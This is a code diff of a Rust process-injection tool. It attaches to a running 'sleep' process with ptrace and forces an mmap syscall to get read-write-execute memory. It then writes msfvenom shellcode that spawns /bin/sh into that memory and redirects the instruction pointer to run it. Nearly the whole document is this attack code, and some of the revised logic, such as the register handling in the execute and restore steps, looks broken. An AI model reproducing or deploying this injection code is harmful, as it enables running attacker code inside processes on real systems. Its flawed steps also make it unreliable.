@@ -1,16 +1,14 @@
 use sysinfo::System;
-use libc::{ptrace, PTRACE_ATTACH, PTRACE_DETACH, PTRACE_GETREGS, PTRACE_SETREGS, PTRACE_POKEDATA, waitpid, pid_t, user_regs_struct, sysconf, _SC_PAGESIZE};
+use libc::{pid_t, ptrace, sysconf, user_regs_struct, waitpid, PTRACE_ATTACH, PTRACE_DETACH, PTRACE_GETREGS, PTRACE_POKEDATA, PTRACE_POKETEXT, PTRACE_SETREGS, PTRACE_SINGLESTEP, _SC_PAGESIZE};
 use std::io;
-use std::fs::OpenOptions;
-use std::io::prelude::*;
-use std::io::SeekFrom;
 
-fn get_process_id_by_name(name: &str) -> Option<sysinfo::Pid> {
+
+fn get_process_id_by_name(name: &str) -> Option<i32> {
     let mut system = System::new_all();
     system.refresh_all();
     for (_, process) in system.processes() {
         if process.name() == name {
-            return Some(process.pid());
+            return Some(process.pid().as_u32() as i32);
         }
     }
     None
@@ -18,87 +16,70 @@ fn get_process_id_by_name(name: &str) -> Option<sysinfo::Pid> {
 
 fn allocate_remote_memory(target_pid: pid_t, size: usize) -> Result<u64, io::Error> {
     unsafe {
-        // Attach to the target process
-        if ptrace(PTRACE_ATTACH, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>()) == -1 {
-            return Err(io::Error::last_os_error());
-        }
-
-        waitpid(target_pid, std::ptr::null_mut(), 0);
-
+        // Get the current registers
         let mut regs: user_regs_struct = std::mem::zeroed();
-        if ptrace(PTRACE_GETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &mut regs) == -1 {
-            return Err(io::Error::last_os_error());
-        }
+        ptrace(PTRACE_GETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &mut regs);
 
-        // Backup registers
+
+        // Store a backup of the original registers
         let original_regs = regs;
+
+        // Align memory size to the page size
         let page_size = sysconf(_SC_PAGESIZE) as usize;
-        let aligned_size: u64 = ((size + page_size - 1) & !(page_size - 1)) as u64;
+        let aligned_size = (((size + page_size - 1) / page_size) * page_size) as u64;
  
         // Set up the syscall arguments for mmap
-        regs.rax = 9;  // mmap syscall number
-        regs.rdi = 0 as u64;  // Set aligned memory address manually
+        regs.rax = libc::SYS_mmap as u64;  // mmap syscall number
+        regs.rdi = 0;  // Set aligned memory address manually
         regs.rsi = aligned_size;  // Page-aligned size
-        regs.rdx = (libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as u64;  // RW permissions (try adding PROT_EXEC if needed)
+        regs.rdx = (libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as u64;  // RWX permissions
         regs.r10 = (libc::MAP_ANONYMOUS | libc::MAP_PRIVATE) as u64;  // Flags
         regs.r8 = u64::MAX;  // Correct file descriptor casting
         regs.r9 = 0;  // Offset
 
-        if ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &regs) == -1 {
-            return Err(io::Error::last_os_error());
-        }
+        // Set the registers with the new syscall arguments
+        ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &regs);
 
-println!("Before syscall:");
-println!("RAX: 0x{:x}", regs.rax);
-println!("RDI (addr): 0x{:x}", regs.rdi);
-println!("RSI (size): {}", regs.rsi);
-println!("RDX (prot): 0x{:x}", regs.rdx);
-println!("R10 (flags): 0x{:x}", regs.r10);
-println!("R8 (fd): 0x{:x}", regs.r8);
-println!("R9 (offset): {}", regs.r9);
-
-        // Execute the syscall
-        ptrace(libc::PTRACE_SYSCALL, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
-        waitpid(target_pid, std::ptr::null_mut(), 0);
-        ptrace(libc::PTRACE_SYSCALL, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
+        // Execute the syscall using the SYSCALL instruction (0x050f)
+        ptrace(PTRACE_POKETEXT, target_pid, regs.rip as *mut libc::c_void, 0x050f); // syscall instruction
+        ptrace(PTRACE_SINGLESTEP, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
         waitpid(target_pid, std::ptr::null_mut(), 0);
 
         // Read the syscall result (allocated address)
         ptrace(PTRACE_GETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &mut regs);
 
-
-println!("After syscall:");
-println!("RAX: 0x{:x}", regs.rax);
-println!("RDI (addr): 0x{:x}", regs.rdi);
-println!("RSI (size): {}", regs.rsi);
-println!("RDX (prot): 0x{:x}", regs.rdx);
-println!("R10 (flags): 0x{:x}", regs.r10);
-println!("R8 (fd): 0x{:x}", regs.r8);
-println!("R9 (offset): {}", regs.r9);
-
         let allocated_address = regs.rax;
+
+        if allocated_address == 0 || allocated_address == u64::MAX {
+            println!("Error allocating memory: 0x{:x}", allocated_address);
+            println!("Error: {}", io::Error::last_os_error());
+            return Err(io::Error::new(io::ErrorKind::Other, "Invalid memory address allocated"));
+        }
 
         if (allocated_address as i64) < 0{
             return Err(io::Error::last_os_error());
         }
 
         // Restore original registers
-        ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &original_regs);
-        ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &original_regs);
-
-
-        // Detach from the process
-        ptrace(PTRACE_DETACH, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
+        ptrace(PTRACE_POKETEXT, target_pid, regs.rip as *mut libc::c_void, original_regs.rip as *mut libc::c_void);
+        if ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &original_regs) == -1 {
+            return Err(io::Error::last_os_error());
+        }
 
         Ok(allocated_address)
     }
 }
 
-fn write_shellcode(pid: libc::pid_t, mut address: u64, shellcode: &[u8]) -> Result<(), std::io::Error> {
+fn write_shellcode(pid: pid_t, mut address: u64, shellcode: &[u8]) -> Result<(), std::io::Error> {
+    println!("Writing shellcode to address: 0x{:x} in process id {}", address, pid);
+    let mut padded_shellcode = shellcode.to_vec();
+    while padded_shellcode.len() % 8 != 0 {
+        padded_shellcode.push(0x90); // NOP sled padding
+    }
     unsafe {
         let mut data = [0u8; 8];
 
-        for (i, chunk) in shellcode.chunks(8).enumerate() {
+        for (_, chunk) in padded_shellcode.chunks(8).enumerate() {
             for (j, &byte) in chunk.iter().enumerate() {
                 data[j] = byte;
             }
@@ -111,39 +92,63 @@ fn write_shellcode(pid: libc::pid_t, mut address: u64, shellcode: &[u8]) -> Resu
             address += 8;
         }
     }
+
+
+    Ok(())
+}
+
+fn execute_shellcode_at_address(address: u64, pid: pid_t) -> Result<(), std::io::Error> {
+    unsafe {
+        let mut regs: user_regs_struct = std::mem::zeroed();
+        ptrace(PTRACE_GETREGS, pid, std::ptr::null_mut::<libc::c_void>(), &regs);
+        ptrace(PTRACE_POKETEXT, pid, regs.rax as *mut libc::c_void, address - 2); 
+        regs.rip = address + 8 + 2; // +2 to skip the SYSCALL instruction
+        println!("Setting RIP to 0x{:x}", regs.rip);
+        ptrace(PTRACE_SETREGS, pid, std::ptr::null_mut::<libc::c_void>(), &regs);
+    }
     Ok(())
 }
 fn main() {
     let process_name = "sleep";
 
-    let shellcode: [u8; 32] = [
-        0x48, 0x31, 0xff,                         // xor    rdi, rdi
-        0x48, 0x89, 0xe6,                         // mov    rsi, rsp
-        0x48, 0x8d, 0x3d, 0x0a, 0x00, 0x00, 0x00, // lea    rdi, [rip+10]
-        0x31, 0xc0,                               // xor    eax, eax
-        0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, // mov    rax, 59 (execve)
-        0x0f, 0x05,                               // syscall
-        0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00  // "/bin/sh"
+    // msfvenom -p linux/x64/exec -f rust
+    let shellcode: [u8; 21] = [
+        0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,
+        0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52,0x5e,0x6a,0x3b,0x58,
+        0x0f,0x05
     ];
+
+    let mut payload = vec![];
+    payload.append([0x90, 0x90, 0x90, 0x90, 0x90, 0x90].to_vec().as_mut());
+    payload.append(&mut shellcode.to_vec());
 
     match get_process_id_by_name(process_name) {
         Some(pid) => {
             println!("Process {} has PID: {}", process_name, pid);
-            match allocate_remote_memory(pid.as_u32() as i32, shellcode.len()) {
+            unsafe { 
+                ptrace(PTRACE_ATTACH, pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
+                waitpid(pid, std::ptr::null_mut(), 0);
+            };
+            match allocate_remote_memory(pid, payload.len()) {
                 Ok(address) => {
-                    if (address as i32) < 0 {
-                        println!("Error allocating memory: {}", io::Error::from_raw_os_error(address as i32));
-                        return;
-                    }
-                    println!("Allocated {:?} bytes at address: 0x{:x}", address, address);
-                    match write_shellcode(pid.as_u32() as i32, address, &shellcode) {
-                        Ok(_) => println!("Shellcode written successfully"),
+                    println!("Allocated memory at address: 0x{:x}", address);
+                    match write_shellcode(pid, address + 8, &payload) {
+                        Ok(_) => {
+                            println!("{} bytes written successfully", payload.len());
+                            match execute_shellcode_at_address(address, pid) {
+                                Ok(_) => println!("Shellcode executed"),
+                                Err(e) => println!("Error executing shellcode: {}", e),
+                            }
+                        },
                         Err(e) => println!("Error writing shellcode: {}", e),
                     }
+                    unsafe { ptrace(PTRACE_DETACH, pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());}
+
                 },
                 Err(e) => println!("Error allocating memory: {}", e),
             }
         } 
         None => println!("Process {} not found", process_name),
     }
+    
 }
